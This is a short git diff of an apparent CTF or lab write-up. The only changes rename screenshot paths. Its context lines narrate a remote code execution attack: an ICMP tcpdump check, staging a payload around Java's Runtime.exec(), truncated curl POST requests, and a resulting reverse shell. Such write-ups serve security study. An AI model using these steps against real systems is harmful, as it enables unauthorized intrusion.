@@ -386,7 +386,7 @@ sudo tcpdump -i tun0 icmp
 
 And we get a ping from the server.
 
-<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
 
 Ok, so we managed to execute code, time to spawn a reverse shell but before that there is one thing we need to know. Our code is using java's [`Runtime.exec()`](https://docs.oracle.com/javase/8/docs/api/java/lang/Runtime.html#exec-java.lang.String-java.lang.String:A-java.io.File-) so we either stage our payload or use:
 
@@ -423,7 +423,7 @@ curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.1
 ```
 {% endcode %}
 
-<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 #### Stage 2 of Payload
 
@@ -443,7 +443,7 @@ curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.1
 ```
 {% endcode %}
 
-<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 And we get rev shell.
 
